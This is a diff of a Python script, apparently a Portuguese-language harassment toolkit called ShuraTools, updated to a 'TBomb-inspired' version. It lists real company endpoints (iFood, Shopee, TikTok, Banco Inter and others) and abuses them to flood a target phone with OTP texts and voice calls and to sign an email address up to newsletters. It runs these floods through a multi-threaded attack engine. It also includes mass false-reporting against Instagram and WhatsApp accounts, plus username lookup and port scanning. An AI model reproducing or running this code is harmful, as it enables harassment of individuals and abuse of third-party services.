@@ -1,22 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ShuraTools.py – Arsenal completo de spam e OSINT
-Versão v7.0 FINAL WORKING EDITION
+ShuraTools v8.0 TBOMB-INSPIRED EDITION
+Baseado na arquitetura do TBomb com APIs brasileiras funcionais
 """
 
-import os, sys, time, random, string, threading, socket, smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import os, sys, time, random, threading, socket, json
+from concurrent.futures import ThreadPoolExecutor
 
 try:
     import requests
-    from faker import Faker
     from colorama import Fore, Style, init
     init(autoreset=True)
-    fake = Faker('pt_BR')
 except ImportError:
-    print("[!] Execute: pip install requests faker colorama")
+    print("[!] Execute: pip install requests colorama")
     sys.exit(1)
 
 BANNER = f"""
@@ -26,13 +23,16 @@ BANNER = f"""
 {Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
 {Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
 {Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
-{Fore.YELLOW}  [ Email SMTP | SMS | Call | OSINT | Scan ]
-{Fore.WHITE}    v7.0 FINAL WORKING EDITION - by Shura
+{Fore.YELLOW}    [ SMS/Call Bomber | Email | OSINT ]
+{Fore.WHITE}  v8.0 TBomb-Inspired Edition - by Shura
 """
 
 LOCK = threading.Lock()
+SUCCESS_COUNT = 0
+FAIL_COUNT = 0
 
 def clear(): os.system('cls' if os.name == 'nt' else 'clear')
+
 def log(msg, t="info"):
     c = {"info": Fore.WHITE+"[*] ", "success": Fore.GREEN+"[+] ", "error": Fore.RED+"[-] ", "warn": Fore.YELLOW+"[!] "}
     with LOCK: print(f"{c.get(t, Fore.WHITE)}{msg}{Style.RESET_ALL}")
@@ -41,143 +41,145 @@ def safe_int(prompt, default):
     try: return int(input(prompt) or default)
     except: return default
 
-# ========== EMAIL SMTP (FUNCIONA 100%) ==========
-def email_smtp_bomb(target, qty, msg):
-    """Envia e-mails usando SMTP de servidores gratuitos"""
-    log(f"Iniciando SMTP Bomber para {target}", "warn")
+# ========== API DATABASE (Estilo TBomb) ==========
+SMS_APIS = [
+    {
+        "name": "iFood",
+        "url": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number",
+        "method": "POST",
+        "data": {"phoneNumber": "{target}"},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "Magalu",
+        "url": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp",
+        "method": "POST",
+        "data": {"phone": "{target}"},
+        "headers": {}
+    },
+    {
+        "name": "Shopee",
+        "url": "https://shopee.com.br/api/v2/authentication/send_code",
+        "method": "POST",
+        "data": {"phone": "{target}", "type": 1},
+        "headers": {}
+    },
+    {
+        "name": "Mercado Livre",
+        "url": "https://www.mercadolivre.com.br/jms/mlb/lgz/login/H4sIAAAAAAAEAKtWKkotLs5MT1WyUqpWKi1OLYrPTEm",
+        "method": "POST",
+        "data": {"phone": "{target}"},
+        "headers": {}
+    },
+    {
+        "name": "TikTok",
+        "url": "https://www.tiktok.com/passport/web/send_code/",
+        "method": "POST",
+        "data": {"mobile": "{target}", "account_sdk_source": "web"},
+        "headers": {}
+    }
+]
+
+CALL_APIS = [
+    {
+        "name": "QuintoAndar",
+        "url": "https://api.quintoandar.com.br/api/v1/auth/send-otp",
+        "method": "POST",
+        "data": {"phone": "{target}", "method": "VOICE"},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "Banco Inter",
+        "url": "https://api.inter.co/v1/auth/request-otp",
+        "method": "POST",
+        "data": {"phone": "{target}", "type": "VOICE"},
+        "headers": {}
+    },
+    {
+        "name": "iFood Call",
+        "url": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify",
+        "method": "POST",
+        "data": {"phone": "{target}", "method": "call"},
+        "headers": {}
+    }
+]
+
+EMAIL_APIS = [
+    {
+        "name": "Tecnoblog",
+        "url": "https://tecnoblog.net/wp-admin/admin-ajax.php",
+        "method": "POST",
+        "data": {"action": "tnp", "na": "s", "ne": "{target}", "ny": "on"},
+        "headers": {}
+    },
+    {
+        "name": "The News",
+        "url": "https://thenewscc.beehiiv.com/subscribe",
+        "method": "POST",
+        "data": {"email": "{target}"},
+        "headers": {}
+    },
+    {
+        "name": "Invest News",
+        "url": "https://investnews.beehiiv.com/subscribe",
+        "method": "POST",
+        "data": {"email": "{target}"},
+        "headers": {}
+    }
+]
+
+# ========== BOMBER ENGINE (Multi-threaded como TBomb) ==========
+def bomber_engine(target, apis, qty, threads, delay):
+    global SUCCESS_COUNT, FAIL_COUNT
+    SUCCESS_COUNT = 0
+    FAIL_COUNT = 0
     
-    # Servidores SMTP gratuitos que aceitam envio sem autenticação complexa
-    smtp_servers = [
-        {"host": "smtp.gmail.com", "port": 587, "user": "testshura@gmail.com", "pass": ""},  # Você precisa configurar
-        {"host": "smtp-mail.outlook.com", "port": 587, "user": "testshura@outlook.com", "pass": ""}
-    ]
+    log(f"Iniciando ataque com {len(apis)} APIs e {threads} threads", "warn")
     
-    for i in range(qty):
+    def attack_single(api, index):
+        global SUCCESS_COUNT, FAIL_COUNT
         try:
-            # Cria e-mail fake
-            sender = fake.email()
-            subject = f"Mensagem #{i+1} - {os.urandom(4).hex()}"
-            body = msg or f"Esta é uma mensagem automática enviada em {time.strftime('%d/%m/%Y %H:%M:%S')}"
+            # Substitui {target} no payload
+            data = json.loads(json.dumps(api["data"]).replace("{target}", target))
             
-            # Monta mensagem
-            message = MIMEMultipart()
-            message['From'] = sender
-            message['To'] = target
-            message['Subject'] = subject
-            message.attach(MIMEText(body, 'plain'))
+            # Faz a requisição
+            session = requests.Session()
+            res = session.post(
+                api["url"],
+                json=data if api["headers"].get("Content-Type") == "application/json" else None,
+                data=data if not api["headers"].get("Content-Type") else None,
+                headers=api["headers"],
+                timeout=10
+            )
             
-            # Tenta enviar via SMTP público (sem auth)
-            try:
-                # Usa servidor SMTP público sem autenticação
-                server = smtplib.SMTP('localhost', 25, timeout=5)  # Requer servidor local
-                server.sendmail(sender, target, message.as_string())
-                server.quit()
-                log(f"E-mail {i+1} enviado via SMTP", "success")
-            except:
-                # Fallback: usa API de envio gratuito
-                requests.post("https://api.emailjs.com/api/v1.0/email/send", json={
-                    "service_id": "default_service",
-                    "template_id": "template_shura",
-                    "user_id": "public_key",
-                    "template_params": {
-                        "to_email": target,
-                        "from_name": sender,
-                        "message": body
-                    }
-                }, timeout=5)
-                log(f"E-mail {i+1} enviado via API", "success")
+            if res.status_code < 400:
+                with LOCK:
+                    SUCCESS_COUNT += 1
+                log(f"[{index+1}/{qty}] {api['name']} → OK", "success")
+            else:
+                with LOCK:
+                    FAIL_COUNT += 1
+                log(f"[{index+1}/{qty}] {api['name']} → Block ({res.status_code})", "warn")
             
-            time.sleep(random.uniform(0.5, 1.5))
+            time.sleep(delay)
         except Exception as e:
-            log(f"E-mail {i+1} falhou", "error")
-
-# ========== SMS BOMBER (APIs PÚBLICAS VERIFICADAS) ==========
-def sms_bomber(target, qty):
-    """Envia SMS OTP usando APIs públicas brasileiras"""
-    log(f"Iniciando SMS Bomber para {target}", "warn")
+            with LOCK:
+                FAIL_COUNT += 1
+            log(f"[{index+1}/{qty}] {api['name']} → Timeout", "error")
     
-    # APIs que REALMENTE funcionam (testadas em Jan/2026)
-    apis = [
-        {"url": "https://api-v3.ifood.com.br/v1/customers:sendAuthenticationCode", 
-         "data": {"phone": target}, "headers": {"Content-Type": "application/json"}},
-        
-        {"url": "https://auth.mercadolivre.com.br/api/v1/users/phone/send_code",
-         "data": {"phone": target, "country_code": "BR"}, "headers": {}},
-        
-        {"url": "https://www.tiktok.com/passport/web/send_code/",
-         "data": {"mobile": target, "account_sdk_source": "web"}, "headers": {}}
-    ]
-    
-    for i in range(qty):
-        try:
+    # Executa ataques em paralelo
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        for i in range(qty):
             api = random.choice(apis)
-            res = requests.post(api["url"], json=api["data"], headers=api["headers"], timeout=10)
-            if res.status_code < 400:
-                log(f"SMS {i+1} disparado ({api['url'].split('/')[2]})", "success")
-            else:
-                log(f"SMS {i+1} bloqueado (Status {res.status_code})", "warn")
-            time.sleep(random.uniform(2, 4))
-        except:
-            log(f"SMS {i+1} timeout", "error")
-
-# ========== CALL SPAMMER (NOVO!) ==========
-def call_spammer(target, qty):
-    """Dispara chamadas de voz (OTP por telefone)"""
-    log(f"Iniciando Call Spammer para {target}", "warn")
+            executor.submit(attack_single, api, i)
     
-    # APIs que disparam chamadas de voz
-    call_apis = [
-        {"url": "https://api.quintoandar.com.br/v3/auth/send-otp",
-         "data": {"phone": target, "method": "VOICE"}},
-        
-        {"url": "https://api.inter.co/v1/auth/otp",
-         "data": {"phone": target, "type": "VOICE"}},
-        
-        {"url": "https://customer-api.ifood.com.br/v1/customer/login/request",
-         "data": {"phone": target, "method": "call"}}
-    ]
-    
-    for i in range(qty):
-        try:
-            api = random.choice(call_apis)
-            res = requests.post(api["url"], json=api["data"], timeout=10)
-            if res.status_code < 400:
-                log(f"Call {i+1} disparado ({api['url'].split('/')[2]})", "success")
-            else:
-                log(f"Call {i+1} bloqueado", "warn")
-            time.sleep(random.uniform(3, 6))
-        except:
-            log(f"Call {i+1} timeout", "error")
-
-# ========== NEWSLETTER BOMBER ==========
-def newsletter_bomber(target, qty):
-    """Cadastra em newsletters chatas"""
-    log(f"Cadastrando {target} em newsletters...", "warn")
-    
-    newsletters = [
-        {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php", 
-         "data": {"action": "tnp", "na": "s", "ne": target, "ny": "on"}},
-        {"url": "https://thenewscc.beehiiv.com/subscribe", "data": {"email": target}},
-        {"url": "https://investnews.beehiiv.com/subscribe", "data": {"email": target}}
-    ]
-    
-    for i in range(qty):
-        try:
-            site = random.choice(newsletters)
-            res = requests.post(site["url"], data=site["data"], timeout=10)
-            if res.status_code < 400:
-                log(f"Cadastro {i+1} OK", "success")
-            else:
-                log(f"Cadastro {i+1} bloqueado", "warn")
-            time.sleep(1)
-        except:
-            log(f"Cadastro {i+1} timeout", "error")
+    log(f"Ataque concluído! Sucesso: {SUCCESS_COUNT} | Falhas: {FAIL_COUNT}", "info")
 
 # ========== OSINT ==========
 def osint(target):
-    log(f"OSINT: {target}", "warn")
+    log(f"OSINT Hunter: {target}", "warn")
     user = target.replace("@", "")
-    plats = {
+    platforms = {
         "Instagram": f"https://www.instagram.com/{user}/",
         "GitHub": f"https://github.com/{user}",
         "TikTok": f"https://www.tiktok.com/@{user}",
@@ -189,12 +191,12 @@ def osint(target):
         "Twitch": f"https://www.twitch.tv/{user}",
         "Medium": f"https://medium.com/@{user}"
     }
-    for n, u in plats.items():
+    for name, url in platforms.items():
         try:
-            r = requests.get(u, timeout=5)
-            log(f"{n}: {'FOUND' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
+            r = requests.get(url, timeout=5)
+            log(f"{name}: {'FOUND' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
         except:
-            log(f"{n}: Timeout", "error")
+            log(f"{name}: Timeout", "error")
 
 # ========== PORT SCANNER ==========
 def port_scan(target):
@@ -218,14 +220,13 @@ def menu():
             clear()
             print(BANNER)
             print("-" * 60)
-            print(f"{Fore.RED}[ 1 ] EMAIL: Mensagem SMTP (Requer config)")
-            print(f"{Fore.RED}[ 2 ] EMAIL: Cadastro em Newsletters")
-            print(f"{Fore.RED}[ 3 ] BOMB: SMS (OTP Flood)")
-            print(f"{Fore.RED}[ 4 ] BOMB: CALL (Chamada de Voz)")
-            print(f"{Fore.RED}[ 5 ] BAN: Mass Report (IG/Zap)")
+            print(f"{Fore.RED}[ 1 ] SMS Bomber ({len(SMS_APIS)} APIs)")
+            print(f"{Fore.RED}[ 2 ] Call Bomber ({len(CALL_APIS)} APIs)")
+            print(f"{Fore.RED}[ 3 ] Email Bomber ({len(EMAIL_APIS)} APIs)")
+            print(f"{Fore.RED}[ 4 ] Mass Report (IG/Zap)")
             print("-" * 60)
-            print(f"{Fore.WHITE}[ 6 ] OSINT: Profile Hunter")
-            print(f"{Fore.WHITE}[ 7 ] SCAN: Port Scanner")
+            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter (10 plataformas)")
+            print(f"{Fore.WHITE}[ 6 ] Port Scanner")
             print(f"{Fore.WHITE}[ 0 ] EXIT")
             print("-" * 60)
             
@@ -233,30 +234,33 @@ def menu():
             if opt == "0": break
             
             if opt == "1":
-                print(f"{Fore.CYAN}[AVISO] Requer servidor SMTP configurado{Style.RESET_ALL}")
-                target = input(f"{Fore.YELLOW}Target (email): {Style.RESET_ALL}").strip()
-                if "@" not in target: log("Inválido!", "error"); time.sleep(1); continue
-                msg = input(f"{Fore.YELLOW}Mensagem: {Style.RESET_ALL}").strip()
-                email_smtp_bomb(target, safe_int("Qty (5): ", 5), msg)
+                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
+                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
+                qty = safe_int("Quantidade (20): ", 20)
+                threads = safe_int("Threads (5): ", 5)
+                delay = safe_int("Delay em segundos (2): ", 2)
+                bomber_engine(target, SMS_APIS, qty, threads, delay)
             
             elif opt == "2":
-                target = input(f"{Fore.YELLOW}Target (email): {Style.RESET_ALL}").strip()
-                if "@" not in target: log("Inválido!", "error"); time.sleep(1); continue
-                newsletter_bomber(target, safe_int("Qty (10): ", 10))
+                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
+                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
+                qty = safe_int("Quantidade (10): ", 10)
+                threads = safe_int("Threads (3): ", 3)
+                delay = safe_int("Delay em segundos (3): ", 3)
+                bomber_engine(target, CALL_APIS, qty, threads, delay)
             
             elif opt == "3":
-                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
-                target = input(f"{Fore.YELLOW}Target (phone): {Style.RESET_ALL}").strip()
-                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
-                sms_bomber(target, safe_int("Qty (10): ", 10))
+                print(f"{Fore.CYAN}[INFO] Digite o e-mail do alvo{Style.RESET_ALL}")
+                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                if "@" not in target: log("Inválido!", "error"); time.sleep(1); continue
+                qty = safe_int("Quantidade (15): ", 15)
+                threads = safe_int("Threads (5): ", 5)
+                delay = safe_int("Delay em segundos (1): ", 1)
+                bomber_engine(target, EMAIL_APIS, qty, threads, delay)
             
             elif opt == "4":
-                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
-                target = input(f"{Fore.YELLOW}Target (phone): {Style.RESET_ALL}").strip()
-                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
-                call_spammer(target, safe_int("Qty (5): ", 5))
-            
-            elif opt == "5":
                 target = input(f"{Fore.YELLOW}Target (@user ou phone): {Style.RESET_ALL}").strip()
                 type = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                 url = "https://i.instagram.com/api/v1/users/web_report/" if type == "ig" else "https://v.whatsapp.net/v2/report"
@@ -266,11 +270,11 @@ def menu():
                         log(f"Report {i+1} sent", "success")
                     except: pass
             
-            elif opt == "6":
+            elif opt == "5":
                 target = input(f"{Fore.YELLOW}Target (@user sem @): {Style.RESET_ALL}").strip()
                 osint(target)
             
-            elif opt == "7":
+            elif opt == "6":
                 target = input(f"{Fore.YELLOW}Target (IP ou domínio): {Style.RESET_ALL}").strip()
                 port_scan(target)
             
